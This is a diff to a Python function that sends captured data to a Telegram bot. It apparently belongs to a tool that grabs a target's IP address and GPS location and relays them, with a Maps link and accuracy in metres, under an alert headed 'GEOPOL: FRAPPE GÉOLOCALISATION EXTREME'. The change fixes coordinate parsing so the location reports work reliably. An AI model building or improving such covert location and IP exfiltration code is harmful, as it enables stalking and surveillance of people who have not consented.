@@ -63,16 +63,17 @@ def tgram_sender(msg_type, content, token):
         send_request(token, ip_message)
 
     if msg_type == 'location':
-        lat = json_content.get('lat')
-        lon = json_content.get('lon')
+        # On s'assure d'enlever le spécificateur " deg" s'il est présent pour garantir la validité du lien Maps
+        lat = str(json_content.get('lat', '')).replace(' deg', '').strip()
+        lon = str(json_content.get('lon', '')).replace(' deg', '').strip()
         maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
         
         loc_message = f"""
 <b>🎯 GEOPOL: FRAPPE GÉOLOCALISATION EXTREME</b>
 
 📡 <b><u>COORDONNÉES GPS</u></b>
-Latitude  : <code>{lat}</code>
-Longitude : <code>{lon}</code>
+Latitude  : <code>{json_content.get('lat')}</code>
+Longitude : <code>{json_content.get('lon')}</code>
 Précision : <b>{json_content.get('acc')} mètres</b>
 
 🧭 <b><u>DONNÉES SUPPLÉMENTAIRES</u></b>
